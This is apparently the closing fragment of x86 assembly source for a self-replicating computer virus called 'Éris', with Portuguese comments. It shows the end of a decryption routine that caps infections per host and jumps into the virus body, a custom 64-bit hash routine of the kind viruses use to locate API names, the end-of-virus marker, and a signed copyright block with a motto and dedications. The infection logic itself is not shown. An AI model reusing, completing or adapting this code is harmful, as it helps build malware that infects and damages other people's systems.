   mov al,6           ; AL = Maximo de infecções sendo executado de um hospedeiro

   jmp Eris           ; Executa o virus...

   DeCrypt endp

   ; -----------------------------------------------------------------
   ;                Calcula Hash64 de uma string
   ; -----------------------------------------------------------------
   ; Entrada:
   ; Arg1 = Ponteiro para string
   ; Arg2 = Tamanho da string
   ; Saida:
   ; EAX = Parte alta do Hash64
   ; EBX = Parte baixa do Hash64

   Hash64 proc

   MAGIC equ "CaoS"

   mov esi,[esp+4] ; ESI = Ponteiro para string
   mov ecx,[esp+8] ; ECX = Tamanho da string

   xor eax,eax     ; EAX = 0
   cdq             ; EDX = 0
   mov ebx,MAGIC   ; EBX = MAGIC
   cld             ; D = 0 (mostra a direção em que ESI deve caminhar)

   nextByte:
   lodsb           ; Carrega ESI em AL, incrementa ESI
   mov dl,8        ; DL = 8

   nextBit:        ;
   rcr al,1        ; RCR AL, 1
   sbb ebx,ecx     ; SBB EBX, ECX
   xor eax,ebx     ; XOR EAX, EBX
   not eax         ; NOT EAX

   dec edx         ; EDX--
   jnz nextBit     ; Tem bits ainda ? Vamos ao proximo...

   rol ebx,cl      ; ROL EBX, CL
   dec ecx         ; ECX--
   jnz nextByte    ; Tem bytes ainda ? Vamos ao proximo...

   div ebx         ; EAX = EAX / EBX
   db 0D6h         ; SALC
   sub eax,ebx     ; SUB EAX, EBX
   rcl eax,0Dh     ; RCL EAX, 0Dh
   adc ebx,edx     ; EBX = EBX + EDX + C
   not edx         ; NOT EDX
   xor eax,edx     ; XOR EAX, EDX

   ret 8           ; Retorna...

   Hash64 endp

   ; -----------------------------------------------------------------
   ;  EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV
   ; -----------------------------------------------------------------
   Eris_Fim label byte
   newsection ends

   ; -----------------------------------------------------------------
   ;        Seção de informações adicionais e/ou copyright
   ; -----------------------------------------------------------------

   cpysection segment dword use32 public 'Xtra-NFO'

   ; Copyright

   db CRLF,CRLF
   db "Éris - by cH4R_"
   db CRLF,CRLF,22h
   db "Nada é verdadeiro, tudo é permitido."
   db 22h,CRLF,CRLF

   ; Xtra nfo

   db CRLF
   db "I love you Djinn, my sweet."
   db CRLF,CRLF
   db "I love you M'Luccian, my little."
   db CRLF,CRLF,0

   cpysection ends

   end inicio
